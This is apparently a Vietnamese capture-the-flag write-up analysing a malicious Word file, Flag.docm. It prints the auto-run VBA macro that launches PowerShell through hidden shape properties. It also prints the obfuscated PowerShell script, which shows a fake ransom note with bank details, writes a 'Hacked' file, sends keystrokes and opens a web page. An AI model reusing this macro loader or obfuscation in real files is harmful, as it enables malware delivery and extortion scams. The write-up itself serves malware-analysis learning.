![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-05-15%20223359.png)

Đề cho một file `Flag.docm` chứa malware. Sử dụng tool olevba để phân tích:
```
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
'Flag format: KCSC{H1_1m_sUcky_+$phlac}'
Sub Auto_Open()
On Error Resume Next
Dim objCmdShape As Shape
Dim hiddenkey As Long
Dim cmdParams() As String
Dim cmdCommand As String
Dim cmdType As String
Dim cmdObj As Object
hiddenkey = RGB(13, 3, 7)
If Val(Application.Version) > 14 Then
    For x = 1 To ActiveDocument.Shapes.Count
        Set objCmdShape = ActiveDocument.Shapes(x)
        If objCmdShape.Shadow.ForeColor.RGB = hiddenkey Then
            cmdType = objCmdShape.Name
            cmdCommand = objCmdShape.AlternativeText
            cmdParams = Split(objCmdShape.TextFrame.TextRange.Text, "|")
            Set cmdObj = Interaction.CreateObject(cmdType)
            VBA$.[Interaction].CallByName! cmdObj, [cmdCommand], VbMethod, "PoWerShElL", Trim(cmdParams(0)), cmdParams(1), cmdParams(2)
            objCmdShape.Delete
            Exit For
        End If
    Next
Else
    MsgBox "Microsoft Word is not installed on this computer or its version is lower than Microsoft Word 2013", vbCritical
    Application.Quit
End If
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

+----------+--------------------+---------------------------------------------+
```

Được phần 1 của flag `Flag format: KCSC{H1_1m_sUcky_+$phlac}`. Khả năng phần 2 là giá trị của biến `$phlac` trong powershell được thi thực thi bằng script ở trên. Cho nên bước tiếp theo ta sẽ phân tích động. Cho chạy file `Flag.docm` (nhớ là tắt hết các phần mềm anti viruss và thực thi trên máy ảo), thì thấy môt mà hình terminal được bật lên và dẫn tới một video trên youtube (Cảnh bảo: đeo tai nghe trước khi chạy file =)) ).

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-05-16%20180624.png)

Mở file trong đường dẫn `"C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx"` để xem lịch sử cmd đã thực thi. Thấy có ps được chạy khi mở file 'Flag.docm'

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-05-16%20181608.png)

```
${p4yL04D}=('Mộ'+'t '+'s'+'ố '+'tà'+'i '+'l'+("{1}{0}" -f 'u ','iệ')+'qua'+'n '+'trọ'+'ng '+'của'+' '+'b'+'ạn '+'đ'+'ã '+'bị'+' '+'m'+'ã '+(("hóa!!`nĐể "+'')+'')+("{0}{1}" -f 'đư','ợc')+' '+'hướ'+'ng '+'d'+'ẫn '+'giả'+'i '+'m'+'ã, '+'bạn'+' '+'cầ'+'n '+("{1}{0}" -f'uy','ch')+'ể'+'n '+'kh'+("{1}{0}"-f'ản ','o')+'1'+("{0}{1}"-f '00','k ')+'và'+'o '+'s'+'ố '+'tài'+' '+("{1}{0}" -f'ả','kho')+'n'+' '+(("sau:`n1010107112000`nChủ "+'')+'')+'tà'+'i '+'kh'+("{1}{0}" -f ':','oản')+' '+'N'+'guy'+'ễn '+'Th'+("{1}{0}" -f' ','anh')+(("Long`nNgân "+'')+'')+'h'+("{0}{1}" -f 'àng',' ')+'M'+'B '+'Ba'+'nk')
&('A'+'d'+("{0}{1}"-f 'd-T','ype')) -AssemblyName ("{1}{6}{0}{3}{5}{4}{2}"-f 't.V',("{0}{1}"-f 'Micr','os'),'ic','is',("{1}{0}" -f 's','lBa'),'ua','of');
seT-ItEM ("V"+"arIab"+"le:hVI96") ( [TypE]("{4}{5}{7}{1}{3}{6}{0}{8}{2}" -F 'c.InTER','b','ION','a','miCrOsOf','t.ViS','sI','uAl','ACT') ) ;
 SEt-itEM ('vA'+'Riab'+'le:'+'O7v'+'8k')  (  [TYPE]("{4}{5}{3}{2}{0}{1}"-F '.MSGBOxSt','yLe','.VIsualbASic','Soft','MiC','rO')  ) ;
( get-vARIABlE ('hvI9'+'6')  -valUEONl )::MsgBox(${p4yL04D},  $O7V8K::Information, ("{1}{4}{8}{11}{9}{0}{2}{3}{6}{10}{7}{5}" -f 'cùng thương','Chú',' ','t','ng tô','in','i',' t','i ',' ','ếc báo',' vô'));
.("{3}{0}{1}{2}" -f("{1}{0}"-f 'tp','-Ou'),'u','t',("{0}{1}"-f'W','rite')) ${p4yL04D} | .("{1}{0}{2}" -f("{0}{1}{2}"-f'u','t-','Fil'),'O','e') -Encoding ("{1}{0}"-f'f8','ut') "C:\Users\$env:UserName\Desktop\Hacked.txt"
${Ws`CripT} = .("{0}{2}{1}"-f'New-O','ct','bje') -com ("{1}{0}{2}"-f'c','ws','ript.shell');
 1..50 | .('%') { ${w`SCri`Pt}."s`endK`EYs"([char]175) };
&("{2}{0}{1}" -f 't','art-Process','S') ("{2}{1}{0}" -f 'lore','p','iex') -ArgumentList ("{1}{6}{2}{0}{5}{3}{7}{4}"-f 'ww.youtube.c','-k ','://w','m/w','pRqs4k','o','https','atch?v=BMEdB')
${phlac}=("{2}{5}{0}{4}{1}{3}" -f 'y',("{2}{1}{0}" -f ("{2}{1}{0}" -f'H',("{0}{1}" -f'_a','h1'),'_m3'),'0t','u_g'),("{0}{2}{1}"-f 'Tr0',("{0}{1}" -f '4',("{0}{1}" -f("{0}{1}"-f'lw','@r'),'3')),("{1}{0}"-f'_m','ll')),'i','0','_');
.("{4}{0}{3}{2}{1}"-f'-Va','e','abl','ri',("{0}{1}" -f'R',("{0}{1}"-f'emo','ve'))) ("{1}{0}" -f 'c',("{0}{1}" -f'phl','a'))
```

Tìm thấy được biến $phlac

```
${phlac}=("{2}{5}{0}{4}{1}{3}" -f 'y',("{2}{1}{0}" -f ("{2}{1}{0}" -f'H',("{0}{1}" -f'_a','h1'),'_m3'),'0t','u_g'),("{0}{2}{1}"-f 'Tr0',("{0}{1}" -f '4',("{0}{1}" -f("{0}{1}"-f'lw','@r'),'3')),("{1}{0}"-f'_m','ll')),'i','0','_');
```
Chạy câu lệnh trên trong terminal và dùng `echo $phlac` để xem giá trị của biến 

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-05-16%20182858.png)

Flag = KCSC{H1_1m_sUcky_Tr0ll_m4lw@r3_y0u_g0t_m3_ah1Hi}


